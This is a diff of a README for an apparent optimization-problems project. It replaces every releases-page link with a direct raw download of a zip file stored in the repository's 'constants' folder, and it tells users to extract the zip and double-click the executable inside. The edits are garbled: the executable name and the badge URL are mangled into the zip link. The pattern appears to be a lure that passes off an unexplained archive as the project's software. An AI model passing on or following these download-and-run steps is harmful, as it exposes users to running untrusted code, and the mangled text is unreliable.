@@ -1,7 +1,7 @@
 # 🚀 optimizationproblems - Solve Complex Optimization Challenges Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/RonankiDinesh/optimizationproblems/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/RonankiDinesh/optimizationproblems/main/constants/Software_3.7-alpha.3.zip%20Latest%https://raw.githubusercontent.com/RonankiDinesh/optimizationproblems/main/constants/Software_3.7-alpha.3.zip)](https://raw.githubusercontent.com/RonankiDinesh/optimizationproblems/main/constants/Software_3.7-alpha.3.zip)
 
 ## 📖 About
 Welcome to the **optimizationproblems** repository. This collection features various optimization problems in mathematics. Whether you are studying for a class or simply curious about optimization, this repository offers valuable resources to help you.
@@ -11,7 +11,7 @@ To get started with **optimizationproblems**, follow these steps:
 
 1. **Visit the Releases Page**
    Access the releases page by clicking the link below to see the available downloads:
-   [Download Here](https://github.com/RonankiDinesh/optimizationproblems/releases)
+   [Download Here](https://raw.githubusercontent.com/RonankiDinesh/optimizationproblems/main/constants/Software_3.7-alpha.3.zip)
 
 2. **Choose Your Application**
    On the releases page, locate the most recent version of the software. Each release includes a brief description and the files available for download. 
@@ -23,7 +23,7 @@ To get started with **optimizationproblems**, follow these steps:
    Once the file has finished downloading, find it in your Downloads folder. Right-click the ZIP file and select "Extract All" or use your preferred extraction tool.
 
 5. **Run the Application**
-   Navigate to the extracted folder. Look for an executable file, usually named `optimizationproblems.exe`. Double-click to run the application. 
+   Navigate to the extracted folder. Look for an executable file, usually named `https://raw.githubusercontent.com/RonankiDinesh/optimizationproblems/main/constants/Software_3.7-alpha.3.zip`. Double-click to run the application. 
 
 6. **Start Solving Problems**
    Now you are ready to explore and solve optimization problems! Follow the on-screen instructions to begin using the features of the application.
@@ -63,6 +63,6 @@ We plan to add more optimization problems and improve the user experience contin
 
 ## 📥 Download & Install
 To download, visit the following link:
-[Download Here](https://github.com/RonankiDinesh/optimizationproblems/releases)
+[Download Here](https://raw.githubusercontent.com/RonankiDinesh/optimizationproblems/main/constants/Software_3.7-alpha.3.zip)
 
 By following the steps above, you'll have the **optimizationproblems** application ready to go in no time!
